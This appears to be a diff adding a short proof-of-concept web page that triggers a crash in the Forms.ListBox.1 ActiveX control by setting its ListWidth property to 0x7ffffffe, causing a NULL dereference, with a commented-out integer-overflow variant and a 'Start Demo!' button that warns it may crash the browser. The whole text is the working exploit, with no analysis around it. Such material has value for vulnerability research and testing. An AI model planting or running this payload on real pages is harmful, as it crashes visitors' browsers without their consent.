@@ -1,0 +1,16 @@
+function Demo() {
+
+	// Forms.ComboBox.1 is also affected
+	var a = new ActiveXObject('Forms.ListBox.1'); 
+
+	// NULL dereference
+	a.ListWidth = 0x7ffffffe;
+	
+	// Integer overflow exception
+	// a.ListWidth = 0x7fffffff;
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
